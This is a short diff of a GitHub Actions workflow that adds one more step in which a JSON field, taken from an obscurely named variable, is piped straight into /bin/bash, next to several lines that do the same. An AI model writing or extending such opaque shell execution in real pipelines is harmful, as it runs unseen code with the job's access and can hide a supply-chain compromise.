@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$raq32804" | jq -r .ttf16665 | /bin/bash
           printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
           echo $vhxd215 | jq -r .i1 | /bin/bash
+          echo $c16 | jq -r .q6 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
